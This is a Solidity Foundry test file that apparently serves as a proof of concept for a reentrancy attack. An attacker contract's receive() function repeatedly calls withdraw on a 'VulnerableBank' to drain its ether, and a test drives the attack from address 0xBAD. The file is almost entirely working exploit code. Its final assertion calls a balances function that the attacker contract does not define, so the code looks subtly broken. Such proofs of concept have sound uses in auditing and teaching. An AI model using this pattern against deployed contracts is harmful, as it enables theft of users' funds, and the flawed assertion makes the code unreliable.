// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/f786f50c-f847-4c8e-bed3-41049160b00d_VulnerableBank.sol";

contract ReentrancyReceiver {
    VulnerableBank private immutable target;
    uint256 private immutable amount;

    constructor(VulnerableBank target_) {
        target = target_;
        amount = 1 ether;
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }

    function attack() external payable {
        require(msg.value == amount, "incorrect seed");
        target.deposit{value: amount}();
        target.withdraw(amount);
    }
}

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    ReentrancyReceiver receiver;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        receiver = new ReentrancyReceiver(target);
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        receiver.attack{value: 1 ether}();
        assertGt(receiver.balances(attacker), 1 ether);
    }
}